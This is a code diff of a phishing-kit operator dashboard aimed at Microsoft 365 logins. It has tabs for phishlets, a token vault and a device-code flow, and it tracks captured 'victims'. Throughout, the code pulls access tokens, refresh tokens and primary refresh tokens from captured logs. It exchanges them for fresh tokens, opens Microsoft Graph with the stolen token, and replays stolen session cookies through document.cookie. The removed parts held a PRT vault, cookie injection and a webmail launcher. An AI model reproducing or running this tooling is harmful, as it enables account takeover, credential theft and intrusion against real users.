@@ -153,6 +153,7 @@
             box-shadow: 0 0 12px #c92a2a;
         }
 
+        /* ----- Tabs ----- */
         .tabs {
             display: flex;
             gap: 4px;
@@ -292,18 +293,6 @@
             padding: 4px 12px;
             font-size: 11px;
             border-radius: 30px;
-        }
-
-        .btn-prt {
-            background: linear-gradient(135deg, #7b1fa2, #9c27b0);
-            border-color: transparent;
-            color: #fff;
-            box-shadow: 0 4px 15px rgba(156, 39, 176, 0.3);
-        }
-        .btn-prt:hover {
-            background: linear-gradient(135deg, #9c27b0, #ab47bc);
-            box-shadow: 0 4px 25px rgba(156, 39, 176, 0.5);
-            border-color: transparent;
         }
 
         .stats {
@@ -467,11 +456,6 @@
             color: #64b5f6;
             border-color: rgba(33, 150, 243, 0.2);
         }
-        .badge-prt {
-            background: rgba(156, 39, 176, 0.2);
-            color: #ce93d8;
-            border-color: rgba(156, 39, 176, 0.3);
-        }
 
         .action-btn {
             background: transparent;
@@ -510,22 +494,6 @@
         .action-btn.token:hover {
             background: rgba(255, 215, 0, 0.08);
             border-color: #ffd700;
-        }
-        .action-btn.webmail {
-            border-color: rgba(130, 177, 255, 0.3);
-            color: #82b1ff;
-        }
-        .action-btn.webmail:hover {
-            background: rgba(130, 177, 255, 0.08);
-            border-color: #82b1ff;
-        }
-        .action-btn.prt {
-            border-color: rgba(156, 39, 176, 0.3);
-            color: #ce93d8;
-        }
-        .action-btn.prt:hover {
-            background: rgba(156, 39, 176, 0.08);
-            border-color: #ce93d8;
         }
 
         .grid-2 {
@@ -683,6 +651,7 @@
             border-color: rgba(0, 0, 0, 0.1) !important;
         }
 
+        /* Toggle switch for phishlets */
         .switch {
             position: relative;
             display: inline-block;
@@ -722,16 +691,6 @@
         input:checked + .slider:before {
             transform: translateX(20px);
             background-color: white;
-        }
-
-        .prt-badge {
-            background: linear-gradient(135deg, #7b1fa2, #9c27b0);
-            color: #fff;
-            padding: 2px 12px;
-            border-radius: 40px;
-            font-size: 11px;
-            font-weight: 600;
-            display: inline-block;
         }
     </style>
 </head>
@@ -787,7 +746,6 @@
     <div class="tabs glass">
         <div class="tab active" data-tab="dashboard" onclick="switchTab('dashboard')">📊 Dashboard</div>
         <div class="tab" data-tab="vault" onclick="switchTab('vault')">🏛️ Token Vault</div>
-        <div class="tab" data-tab="prt" onclick="switchTab('prt')" style="border-color: rgba(156, 39, 176, 0.3); color: #ce93d8;">🟣 PRT Vault</div>
         <div class="tab" data-tab="analytics" onclick="switchTab('analytics')">📈 Analytics</div>
         <div class="tab" data-tab="phishlets" onclick="switchTab('phishlets')">🎭 Phishlets</div>
         <div class="tab" data-tab="device" onclick="switchTab('device')" style="border-color: rgba(255,215,0,0.2); color: #ffd700;">📱 Device Code</div>
@@ -851,43 +809,6 @@
                 <thead><tr><th>Username</th><th>Type</th><th>Status</th><th>Source</th><th>Timestamp</th><th>Actions</th></tr></thead>
                 <tbody id="vaultTable">
                     <tr><td colspan="6" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No tokens in vault. Click "Scan Logs" to extract tokens.</td></tr>
-                </tbody>
-            </table>
-        </div>
-    </div>
-
-    <!-- ==================== TAB: PRT Vault ==================== -->
-    <div id="tab-prt" class="tab-content">
-        <div class="toolbar glass">
-            <button class="btn btn-prt" onclick="scanPRTs()">🔍 Scan for PRTs</button>
-            <button class="btn btn-success" onclick="healthCheckPRTs()">🩺 Health Check</button>
-            <button class="btn btn-warning" onclick="exchangeAllPRTs()">🔄 Exchange All</button>
-            <span style="margin-left:auto;font-size:13px;color:rgba(255,255,255,0.4);" id="prtStats">📊 0 PRTs · 0 users</span>
-        </div>
-        
-        <div class="stats">
-            <div class="stat-card glass" style="border-color: rgba(156, 39, 176, 0.2);">
-                <label>Total PRTs</label>
-                <div class="value" style="background: linear-gradient(135deg, #ce93d8, #9c27b0); -webkit-background-clip: text; -webkit-text-fill-color: transparent;" id="prtTotal">0</div>
-                <div class="sub">Captured</div>
-            </div>
-            <div class="stat-card glass" style="border-color: rgba(156, 39, 176, 0.2);">
-                <label>Unique Users</label>
-                <div class="value" style="background: linear-gradient(135deg, #ce93d8, #7b1fa2); -webkit-background-clip: text; -webkit-text-fill-color: transparent;" id="prtUsers">0</div>
-                <div class="sub">Victims</div>
-            </div>
-            <div class="stat-card glass" style="border-color: rgba(156, 39, 176, 0.2);">
-                <label>Healthy PRTs</label>
-                <div class="value" style="background: linear-gradient(135deg, #81c784, #4caf50); -webkit-background-clip: text; -webkit-text-fill-color: transparent;" id="prtHealthy">0</div>
-                <div class="sub">Active</div>
-            </div>
-        </div>
-        
-        <div class="table-wrap glass" style="padding: 8px;">
-            <table>
-                <thead><tr><th>Username</th><th>PRT (truncated)</th><th>Source</th><th>Captured</th><th>Last Refresh</th><th>Status</th><th>Actions</th></tr></thead>
-                <tbody id="prtTable">
-                    <tr><td colspan="7" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No PRTs found. Click "Scan for PRTs" to extract from logs.</td></tr>
                 </tbody>
             </table>
         </div>
@@ -961,6 +882,7 @@
             <span style="margin-left:auto;font-size:13px;color:rgba(255,255,255,0.4);" id="deviceStats">📊 0 flows · 0 approved</span>
         </div>
 
+        <!-- Stats -->
         <div class="stats">
             <div class="stat-card glass">
                 <label>Active Flows</label>
@@ -979,6 +901,7 @@
             </div>
         </div>
 
+        <!-- Table -->
         <div class="table-wrap glass" style="padding: 8px;">
             <table>
                 <thead><tr><th>Code</th><th>Status</th><th>Created</th><th>Approved</th><th>Token Type</th><th>Actions</th></tr></thead>
@@ -988,12 +911,13 @@
             </table>
         </div>
 
+        <!-- Manual Code Generator -->
         <div class="glass" style="padding: 16px; margin-top: 16px;">
             <h4 style="color: rgba(255,255,255,0.5); font-weight: 400; margin-bottom: 8px;">🔧 Manual Code Generator</h4>
             <div style="display: flex; gap: 12px; flex-wrap: wrap; align-items: center;">
                 <input type="text" id="manualCode" placeholder="Enter custom code (e.g., ABC123)" style="flex:1; min-width:200px; background:rgba(255,255,255,0.06); border:1px solid rgba(255,255,255,0.1); border-radius:40px; padding:8px 18px; color:#e0e8f0; outline:none;">
                 <button class="btn btn-warning" onclick="generateManualCode()">🔑 Generate</button>
-                <button class="btn" onclick="copyManualCode()">📋 Copy</button>
+                <button class="btn" onclick="copyCode()">📋 Copy</button>
             </div>
             <div id="manualCodeResult" style="margin-top:8px; font-size:14px; color:rgba(255,255,255,0.4);"></div>
         </div>
@@ -1026,8 +950,6 @@
     let vaultTokens = [];
     let deviceHistory = [];
     let deviceInterval;
-    let prtInterval;
-    let mapMarkers = [];
 
     // =============================================
     // THEME
@@ -1054,7 +976,6 @@
         document.querySelector(`.tab[data-tab="${tabId}"]`).classList.add('active');
         
         if (tabId === 'vault') loadVault();
-        if (tabId === 'prt') loadPRTs();
         if (tabId === 'analytics') loadAnalytics();
         if (tabId === 'phishlets') loadPhishlets();
         if (tabId === 'device') {
@@ -1088,6 +1009,7 @@
             if (reconnectAttempts < maxReconnectAttempts) {
                 reconnectAttempts++;
                 const delay = Math.min(5000 + reconnectAttempts * 1000, 30000);
+                console.log(`🔄 Reconnecting... (${reconnectAttempts}/${maxReconnectAttempts}) in ${delay/1000}s`);
                 setTimeout(connectWebSocket, delay);
             }
         };
@@ -1105,7 +1027,9 @@
                 } else if (data === 'pong') {
                     // Heartbeat response
                 }
-            } catch (e) {}
+            } catch (e) {
+                // Not JSON, ignore
+            }
         };
     }
 
@@ -1140,63 +1064,6 @@
     }
 
     // =============================================
-    // IP TO LOCATION
-    // =============================================
-    async function getIPLocation(ip) {
-        try {
-            const res = await fetch(`https://ipapi.co/${ip}/json/`);
-            const data = await res.json();
-            if (data.latitude && data.longitude) {
-                return { lat: data.latitude, lon: data.longitude, country: data.country_name, city: data.city };
-            }
-            return null;
-        } catch (e) {
-            return null;
-        }
-    }
-
-    // =============================================
-    // COOKIE INJECTION - UNIVERSAL
-    // =============================================
-    function injectTokenAsCookie(token, domain = '.login.microsoftonline.com') {
-        if (!token) {
-            showToast('❌ No token to inject', true);
-            return;
-        }
-        
-        try {
-            document.cookie = `access_token=${token}; path=/; domain=${domain}; Secure; SameSite=None`;
-            document.cookie = `jwt=${token}; path=/; domain=${domain}; Secure; SameSite=None`;
-            document.cookie = `authorization=${token}; path=/; domain=${domain}; Secure; SameSite=None`;
-            
-            localStorage.setItem('evil_token', token);
-            localStorage.setItem('evil_token_direct', token);
-            
-            showToast(`✅ Token injected as cookie for ${domain}`);
-            
-            if (confirm(`Token injected as cookie. Redirect to ${domain} to use it?`)) {
-                window.location.href = `https://${domain}`;
-            }
-        } catch (e) {
-            showToast('❌ Cookie injection failed: ' + e.message, true);
-        }
-    }
-
-    // =============================================
-    // WEBMAIL LAUNCHER
-    // =============================================
-    function openWebmail(token, username = 'User') {
-        if (!token) {
-            showToast('❌ No token available', true);
-            return;
-        }
-        localStorage.setItem('evil_token_direct', token);
-        localStorage.setItem('evil_token_user', username);
-        window.open('/webmail', '_blank');
-        showToast(`📧 Opening webmail for ${username}...`);
-    }
-
-    // =============================================
     // DASHBOARD TAB
     // =============================================
     async function refreshLogs() {
@@ -1206,9 +1073,9 @@
             allLogs = logs;
             renderTable(logs);
             updateStats(logs);
+            updateMap(logs);
             updateChart(logs);
             await fetchVisits();
-            await updateMapWithVisits();
         } catch (e) {
             showToast('Failed to fetch logs: ' + e.message, true);
         }
@@ -1244,28 +1111,11 @@
                     <button class="action-btn cookie" onclick="injectCookies('${log.name}')">🍪 Inject</button>
                     <button class="action-btn replay" onclick="replaySession('${log.name}')" style="border-color:rgba(0,255,200,0.3);color:#00ffc8;">▶ Replay</button>
                     <button class="action-btn token" onclick="showTokens('${log.name}')" style="border-color:rgba(255,215,0,0.3);color:#ffd700;">🔑 Tokens</button>
-                    <button class="action-btn webmail" onclick="openWebmailFromLog('${log.name}')" style="border-color:rgba(130,177,255,0.3);color:#82b1ff;">📧 Webmail</button>
                 </td>
             `;
             tbody.appendChild(row);
             fetchMetadata(log.name);
         });
-    }
-
-    async function openWebmailFromLog(filename) {
-        try {
-            const res = await fetch(`/dash/api/tokens/${filename}`);
-            const data = await res.json();
-            if (data.tokens && data.tokens.access_tokens && data.tokens.access_tokens.length > 0) {
-                const token = data.tokens.access_tokens[0];
-                const username = data.tokens.username || 'User';
-                openWebmail(token, username);
-            } else {
-                showToast('❌ No access token found in this log', true);
-            }
-        } catch (e) {
-            showToast('❌ Failed to extract token: ' + e.message, true);
-        }
     }
 
     async function fetchMetadata(filename) {
@@ -1302,7 +1152,7 @@
                 const ipCell = document.getElementById(`ip-${filename}`);
                 if (ipCell) ipCell.textContent = ip;
             }
-        } catch (e) {}
+        } catch (e) { /* silently fail */ }
     }
 
     function updateStats(logs) {
@@ -1312,6 +1162,20 @@
         } else {
             document.getElementById('last').textContent = 'No captures';
         }
+    }
+
+    function updateMap(logs) {
+        if (!map) {
+            map = L.map('map').setView([20, 0], 2);
+            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+                attribution: '&copy; OpenStreetMap, &copy; CartoDB'
+            }).addTo(map);
+        }
+        map.eachLayer(layer => {
+            if (layer instanceof L.Marker) map.removeLayer(layer);
+        });
+        L.marker([20, 0]).addTo(map)
+            .bindPopup('📍 IP locations will appear here once you have captures.');
     }
 
     function updateChart(logs) {
@@ -1357,66 +1221,6 @@
         });
     }
 
-    async function updateMapWithVisits() {
-        try {
-            const res = await fetch('/dash/api/visits');
-            const data = await res.json();
-            if (!data.visits || data.visits.length === 0) {
-                if (!map) {
-                    map = L.map('map').setView([20, 0], 2);
-                    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
-                        attribution: '&copy; OpenStreetMap, &copy; CartoDB'
-                    }).addTo(map);
-                }
-                return;
-            }
-
-            const uniqueIPs = [...new Set(data.visits.map(v => v.ip).filter(ip => ip !== 'Unknown'))];
-            const locations = [];
-            for (const ip of uniqueIPs.slice(0, 20)) {
-                const loc = await getIPLocation(ip);
-                if (loc) {
-                    locations.push({ ip, ...loc });
-                }
-            }
-
-            if (!map) {
-                map = L.map('map').setView([20, 0], 2);
-                L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
-                    attribution: '&copy; OpenStreetMap, &copy; CartoDB'
-                }).addTo(map);
-            }
-
-            mapMarkers.forEach(m => map.removeLayer(m));
-            mapMarkers = [];
-
-            locations.forEach(loc => {
-                if (loc.lat && loc.lon) {
-                    const marker = L.circleMarker([loc.lat, loc.lon], {
-                        radius: 8,
-                        fillColor: '#82b1ff',
-                        color: '#536dfe',
-                        weight: 2,
-                        opacity: 0.8,
-                        fillOpacity: 0.6
-                    }).addTo(map);
-                    marker.bindPopup(`
-                        <b>IP:</b> ${loc.ip}<br>
-                        <b>Location:</b> ${loc.city}, ${loc.country}
-                    `);
-                    mapMarkers.push(marker);
-                }
-            });
-
-            if (locations.length > 0) {
-                const bounds = L.latLngBounds(locations.filter(l => l.lat && l.lon).map(l => [l.lat, l.lon]));
-                if (bounds.isValid()) map.fitBounds(bounds, { padding: [50, 50] });
-            }
-        } catch (e) {
-            console.error('Failed to update map:', e);
-        }
-    }
-
     async function fetchVisits() {
         try {
             const res = await fetch('/dash/api/visits');
@@ -1431,7 +1235,7 @@
                 return;
             }
             tbody.innerHTML = '';
-            data.visits.slice(0, 50).forEach(visit => {
+            data.visits.forEach(visit => {
                 const row = document.createElement('tr');
                 const time = new Date(visit.timestamp).toLocaleString();
                 const userAgent = visit.userAgent || 'Unknown';
@@ -1510,7 +1314,7 @@
     }
 
     // =============================================
-    // INJECT COOKIES - UPDATED (Auto-inject)
+    // INJECT COOKIES
     // =============================================
     async function injectCookies(filename) {
         try {
@@ -1537,23 +1341,12 @@
                 showToast('No cookies found.', true);
                 return;
             }
-
-            allCookies.forEach(c => {
-                try {
-                    document.cookie = c + '; path=/; domain=' + window.location.hostname + '; Secure';
-                } catch (e) {}
-            });
-            
             const cookieString = allCookies.join('; ');
-            await navigator.clipboard.writeText(cookieString);
-            
-            showToast(`🍪 ${allCookies.length} cookies injected into current browser + copied to clipboard!`);
-            
-            if (confirm(`${allCookies.length} cookies injected. Redirect to target domain?`)) {
-                const targetDomain = prompt('Enter target domain to redirect to:', 'login.microsoftonline.com');
-                if (targetDomain) {
-                    window.location.href = `https://${targetDomain}`;
-                }
+            try {
+                await navigator.clipboard.writeText(cookieString);
+                showToast(`🍪 ${allCookies.length} cookies copied to clipboard. Paste in browser console: document.cookie = "${cookieString}"`);
+            } catch (e) {
+                showToast('Failed to copy. Manual: ' + cookieString);
             }
         } catch (e) {
             showToast('Error: ' + e.message, true);
@@ -1581,7 +1374,7 @@
     }
 
     // =============================================
-    // SHOW TOKENS - Updated with PRT support
+    // SHOW TOKENS
     // =============================================
     async function showTokens(filename) {
         try {
@@ -1593,23 +1386,25 @@
                 showToast('❌ Token extraction failed: ' + data.error, true);
                 return;
             }
-            const tokens = data.tokens || {};
+            const tokens = data.tokens;
             let msg = `🔑 Extracted:\n`;
-            msg += `  • Access tokens: ${tokens.access_tokens?.length || 0}\n`;
-            msg += `  • Refresh tokens: ${tokens.refresh_tokens?.length || 0}\n`;
-            msg += `  • ID tokens: ${tokens.id_tokens?.length || 0}\n`;
-            msg += `  • PRT tokens: ${tokens.prt_tokens?.length || 0}\n`;
-            msg += `  • Cookies: ${tokens.cookies?.length || 0}\n`;
-            msg += `  • Sessions: ${tokens.sessions?.length || 0}`;
+            msg += `  • Access tokens: ${tokens.access_tokens.length}\n`;
+            msg += `  • Refresh tokens: ${tokens.refresh_tokens.length}\n`;
+            msg += `  • ID tokens: ${tokens.id_tokens.length}\n`;
+            msg += `  • Cookies: ${tokens.cookies.length}\n`;
+            msg += `  • Sessions: ${tokens.sessions.length}`;
             
-            if (tokens.prt_tokens?.length > 0) {
+            const hasPrt = tokens.prt || tokens.flowToken;
+            if (hasPrt) {
                 msg += `\n\n🔑 **PRT Found!** (Long-term access)`;
+                msg += `\n   📝 Length: ${(tokens.prt || tokens.flowToken).length} chars`;
+                msg += `\n\n   💡 Click OK to exchange PRT for a fresh access token.`;
                 if (confirm(msg + '\n\nExchange PRT for a new access token?')) {
-                    await exchangePRT(tokens.prt_tokens[0]);
+                    await exchangePRT(tokens.prt || tokens.flowToken);
                     return;
                 }
             }
-            if (tokens.refresh_tokens?.length > 0) {
+            if (tokens.refresh_tokens.length > 0) {
                 msg += `\n\n🔄 Refresh token available. Click OK to exchange.`;
                 if (confirm(msg + '\n\nExchange refresh token for new access token?')) {
                     await exchangeRefreshToken(tokens.refresh_tokens[0]);
@@ -1624,21 +1419,16 @@
 
     async function exchangeRefreshToken(refreshToken) {
         try {
-            const response = await fetch('/dash/api/vault/exchange', {
+            const response = await fetch('/dash/api/exchange', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ tokenValue: refreshToken })
+                body: JSON.stringify({ refresh_token: refreshToken })
             });
             const data = await response.json();
-            if (data.success) {
-                const tokenData = data.data || data;
-                if (tokenData.access_token) {
-                    showToast(`✅ New access token obtained.`);
-                    localStorage.setItem('evil_token', JSON.stringify(tokenData));
-                    window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${tokenData.access_token}`, '_blank');
-                } else {
-                    showToast('❌ Exchange failed: No access token in response', true);
-                }
+            if (data.access_token) {
+                showToast(`✅ New access token obtained.`);
+                localStorage.setItem('evil_token', JSON.stringify(data));
+                window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.access_token}`, '_blank');
             } else {
                 showToast('❌ Exchange failed: ' + (data.error || 'Unknown error'), true);
             }
@@ -1647,23 +1437,18 @@
         }
     }
 
-    async function exchangePRT(prt) {
+    async function exchangePRT(token) {
         try {
             const response = await fetch('/dash/api/prt/exchange', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ prt })
+                body: JSON.stringify({ prt: token })
             });
             const data = await response.json();
-            if (data.success) {
-                const tokenData = data.data || data;
-                if (tokenData.access_token) {
-                    showToast(`✅ PRT exchange successful!`);
-                    localStorage.setItem('evil_token', JSON.stringify(tokenData));
-                    window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${tokenData.access_token}`, '_blank');
-                } else {
-                    showToast('❌ PRT exchange failed: No access token', true);
-                }
+            if (data.access_token) {
+                showToast(`✅ PRT exchange successful!`);
+                localStorage.setItem('evil_token', JSON.stringify(data));
+                window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.access_token}`, '_blank');
             } else {
                 showToast('❌ PRT exchange failed: ' + (data.error || 'Unknown error'), true);
             }
@@ -1727,7 +1512,7 @@
             const res = await fetch('/dash/api/vault/healthcheck', { method: 'POST' });
             const data = await res.json();
             if (data.success) {
-                const valid = data.results.filter(r => r.status === 'valid').length;
+                const valid = data.results.filter(r => r.result.valid).length;
                 showToast(`✅ ${valid} valid tokens, ${data.results.length - valid} expired.`);
                 loadVault();
             }
@@ -1748,7 +1533,7 @@
             if (statsData.success) {
                 const s = statsData.stats;
                 document.getElementById('vaultStats').textContent = 
-                    `📊 ${s.total} tokens · ${s.access} access · ${s.refresh} refresh · ${s.prt} PRT`;
+                    `📊 ${s.total} tokens · ${s.valid} valid · ${s.expired} expired · ${s.unknown} unknown`;
             }
             
             const tbody = document.getElementById('vaultTable');
@@ -1764,25 +1549,22 @@
                 const statusLabel = token.status === 'valid' ? '✅ Valid' : 
                                    token.status === 'expired' ? '❌ Expired' : '⚠️ Unknown';
                 const typeMap = {
-                    'access': '🔑 Access',
-                    'refresh': '🔄 Refresh',
-                    'id': '🆔 ID',
+                    'access_token': '🔑 Access',
+                    'refresh_token': '🔄 Refresh',
+                    'id_token': '🆔 ID',
                     'prt': '🔐 PRT',
-                    'flow': '🌊 Flow'
+                    'flow_token': '🌊 Flow'
                 };
                 const typeDisplay = typeMap[token.type] || token.type;
-                const time = token.timestamp ? new Date(token.timestamp).toLocaleString() : 'N/A';
-                const isPRT = token.type === 'prt';
+                const time = new Date(token.timestamp).toLocaleString();
                 row.innerHTML = `
-                    <td><span style="font-weight:500;">${token.username || 'Unknown'}</span></td>
-                    <td><span class="badge ${isPRT ? 'badge-prt' : 'badge-info'}">${typeDisplay}</span></td>
+                    <td><span style="font-weight:500;">${token.username}</span></td>
+                    <td><span class="badge badge-info">${typeDisplay}</span></td>
                     <td><span class="badge ${statusClass}">${statusLabel}</span></td>
-                    <td style="font-size:12px; color:rgba(255,255,255,0.4);">${token.file || 'N/A'}</td>
+                    <td style="font-size:12px; color:rgba(255,255,255,0.4);">${token.sourceFile || 'N/A'}</td>
                     <td style="font-size:12px; color:rgba(255,255,255,0.4);">${time}</td>
                     <td>
-                        ${isPRT ? `<button class="action-btn prt" onclick="exchangePRT('${token.value}')">🔄 Exchange</button>` : `<button class="action-btn token" onclick="exchangeVaultToken('${token.value}')">🔄 Exchange</button>`}
-                        <button class="action-btn cookie" onclick="injectTokenAsCookie('${token.value}')">🍪 Inject</button>
-                        <button class="action-btn webmail" onclick="openWebmail('${token.value}', '${token.username || 'User'}')">📧 Webmail</button>
+                        <button class="action-btn token" onclick="exchangeVaultToken('${token.value}')">🔄 Exchange</button>
                         <button class="action-btn" onclick="navigator.clipboard.writeText('${token.value}')">📋 Copy</button>
                     </td>
                 `;
@@ -1803,117 +1585,15 @@
             });
             const data = await res.json();
             if (data.success) {
-                const tokenData = data.data || data;
-                if (tokenData.access_token) {
-                    showToast(`✅ New access token obtained!`);
-                    localStorage.setItem('evil_token', JSON.stringify(tokenData));
-                    window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${tokenData.access_token}`, '_blank');
-                    loadVault();
-                } else {
-                    showToast('❌ Exchange failed: No access token in response', true);
-                }
+                showToast(`✅ New access token obtained!`);
+                localStorage.setItem('evil_token', JSON.stringify(data.data));
+                window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.data.access_token}`, '_blank');
+                loadVault();
             } else {
                 showToast('❌ Exchange failed: ' + (data.error || 'Unknown error'), true);
             }
         } catch (e) {
             showToast('❌ Exchange error: ' + e.message, true);
-        }
-    }
-
-    // =============================================
-    // PRT VAULT TAB
-    // =============================================
-    async function scanPRTs() {
-        showToast('🔍 Scanning logs for PRTs...');
-        try {
-            const res = await fetch('/dash/api/prt/scan', { method: 'POST' });
-            const data = await res.json();
-            if (data.success) {
-                showToast(`✅ Found ${data.count} PRTs`);
-                loadPRTs();
-            }
-        } catch (e) {
-            showToast('❌ Scan failed: ' + e.message, true);
-        }
-    }
-
-    async function loadPRTs() {
-        try {
-            const res = await fetch('/dash/api/prt/list');
-            const data = await res.json();
-            if (!data.success) return;
-            const prts = data.prts || [];
-            
-            // Update stats
-            document.getElementById('prtTotal').textContent = prts.length;
-            const uniqueUsers = new Set(prts.map(p => p.username)).size;
-            document.getElementById('prtUsers').textContent = uniqueUsers;
-            const healthy = prts.filter(p => p.last_refresh).length;
-            document.getElementById('prtHealthy').textContent = healthy;
-            document.getElementById('prtStats').textContent = `📊 ${prts.length} PRTs · ${uniqueUsers} users · ${healthy} healthy`;
-            
-            const tbody = document.getElementById('prtTable');
-            if (prts.length === 0) {
-                tbody.innerHTML = `<tr><td colspan="7" style="text-align:center; color:rgba(255,255,255,0.3); padding:20px;">No PRTs found. Click "Scan for PRTs" to extract from logs.</td></tr>`;
-                return;
-            }
-            
-            tbody.innerHTML = '';
-            prts.forEach((item) => {
-                const row = document.createElement('tr');
-                const truncated = item.prt ? item.prt.slice(0, 30) + '...' : 'N/A';
-                const captured = item.timestamp ? new Date(item.timestamp).toLocaleString() : 'N/A';
-                const refreshed = item.last_refresh ? new Date(item.last_refresh).toLocaleString() : 'Never';
-                const hasAccess = item.access_token ? '✅ Yes' : '❌ No';
-                
-                row.innerHTML = `
-                    <td><span style="font-weight:500; color:#ce93d8;">${item.username || 'Unknown'}</span></td>
-                    <td style="font-family:monospace; font-size:11px; color:rgba(255,255,255,0.5);">${truncated}</td>
-                    <td style="font-size:12px; color:rgba(255,255,255,0.4);">${item.sourceFile || 'N/A'}</td>
-                    <td style="font-size:12px; color:rgba(255,255,255,0.4);">${captured}</td>
-                    <td style="font-size:12px; color:rgba(255,255,255,0.4);">${refreshed}</td>
-                    <td><span class="badge ${item.access_token ? 'badge-success' : 'badge-warning'}">${hasAccess}</span></td>
-                    <td>
-                        <button class="action-btn prt" onclick="exchangePRT('${item.prt}')" style="border-color:rgba(156,39,176,0.3);color:#ce93d8;">🔄 Exchange</button>
-                        <button class="action-btn" onclick="navigator.clipboard.writeText('${item.prt}')">📋 Copy</button>
-                        <button class="action-btn cookie" onclick="injectTokenAsCookie('${item.prt}')">🍪 Inject</button>
-                    </td>
-                `;
-                tbody.appendChild(row);
-            });
-        } catch (e) {
-            console.error('Failed to load PRTs:', e);
-        }
-    }
-
-    async function healthCheckPRTs() {
-        showToast('🩺 Checking PRT health...');
-        try {
-            const res = await fetch('/dash/api/prt/health-all', { method: 'POST' });
-            const data = await res.json();
-            if (data.success) {
-                const valid = data.results.filter(r => r.valid).length;
-                showToast(`✅ ${valid} valid, ${data.results.length - valid} invalid`);
-                loadPRTs();
-            }
-        } catch (e) {
-            showToast('❌ Health check failed: ' + e.message, true);
-        }
-    }
-
-    async function exchangeAllPRTs() {
-        if (!confirm('Exchange all PRTs for fresh tokens?')) return;
-        showToast('🔄 Exchanging all PRTs...');
-        try {
-            const res = await fetch('/dash/api/prt/exchange-all', { method: 'POST' });
-            const data = await res.json();
-            if (data.success) {
-                const success = data.results.filter(r => r.success).length;
-                showToast(`✅ ${success} PRTs exchanged successfully`);
-                loadPRTs();
-            }
-        } catch (e) {
-            showToast('❌ Exchange failed: ' + e.message, true);
         }
     }
 
@@ -2095,7 +1775,7 @@
             return;
         }
         tbody.innerHTML = '';
-        deviceHistory.slice(0, 50).forEach((flow) => {
+        deviceHistory.slice(0, 50).forEach(flow => {
             const row = document.createElement('tr');
             const statusColors = {
                 'pending': 'badge-warning',
@@ -2111,25 +1791,17 @@
             const statusLabel = statusLabels[flow.status] || flow.status;
             const created = new Date(flow.created).toLocaleString();
             const approved = flow.approved ? new Date(flow.approved).toLocaleString() : '—';
-            
-            let actionsHtml = '';
-            if (flow.status === 'pending') {
-                actionsHtml += `<button class="action-btn" onclick="showDeviceCode('${flow.user_code}')">📋 Show Code</button>`;
-            }
-            if (flow.access_token) {
-                actionsHtml += `<button class="action-btn token" onclick="useDeviceToken('${flow.session_id}')">🔑 Use</button>`;
-                actionsHtml += `<button class="action-btn cookie" onclick="injectTokenAsCookie('${flow.access_token}')">🍪 Inject</button>`;
-                actionsHtml += `<button class="action-btn webmail" onclick="openWebmail('${flow.access_token}', '${flow.username || 'User'}')">📧 Webmail</button>`;
-            }
-            actionsHtml += `<button class="action-btn" onclick="copyDeviceCode('${flow.user_code}')">📋 Copy</button>`;
-            
             row.innerHTML = `
                 <td><span style="font-family:monospace; font-weight:600; background:rgba(255,255,255,0.05); padding:2px 8px; border-radius:4px;">${flow.user_code}</span></td>
                 <td><span class="badge ${statusClass}">${statusLabel}</span></td>
                 <td style="font-size:12px; color:rgba(255,255,255,0.4);">${created}</td>
                 <td style="font-size:12px; color:rgba(255,255,255,0.4);">${approved}</td>
                 <td><span class="badge badge-info">${flow.token_type || 'N/A'}</span></td>
-                <td>${actionsHtml}</td>
+                <td>
+                    ${flow.status === 'pending' ? `<button class="action-btn" onclick="showDeviceCode('${flow.user_code}')">📋 Show Code</button>` : ''}
+                    ${flow.access_token ? `<button class="action-btn token" onclick="useDeviceToken('${flow.session_id}')">🔑 Use</button>` : ''}
+                    <button class="action-btn" onclick="copyDeviceCode('${flow.user_code}')">📋 Copy</button>
+                </td>
             `;
             tbody.appendChild(row);
         });
@@ -2184,7 +1856,7 @@
         });
     }
 
-    function copyManualCode() {
+    function copyCode() {
         const result = document.getElementById('manualCodeResult').innerHTML;
         const match = result.match(/<strong[^>]*>([A-Z0-9]+)<\/strong>/);
         if (match) {
@@ -2204,8 +1876,9 @@
             });
             const data = await res.json();
             if (data.success && data.access_token) {
-                showToast(`✅ Token obtained! Opening webmail...`);
-                openWebmail(data.access_token, data.username || 'User');
+                showToast(`✅ Token obtained! Opening Graph Explorer...`);
+                localStorage.setItem('evil_token', JSON.stringify(data));
+                window.open(`https://developer.microsoft.com/en-us/graph/graph-explorer?token=${data.access_token}`, '_blank');
             } else {
                 showToast('❌ Failed to use token: ' + (data.error || 'Unknown'), true);
             }
@@ -2220,15 +1893,6 @@
     connectWebSocket();
     refreshLogs();
     setInterval(refreshLogs, 15000);
-
-    window.addEventListener('load', function() {
-        if (!map) {
-            map = L.map('map').setView([20, 0], 2);
-            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
-                attribution: '&copy; OpenStreetMap, &copy; CartoDB'
-            }).addTo(map);
-        }
-    });
 </script>
 </body>
 </html>
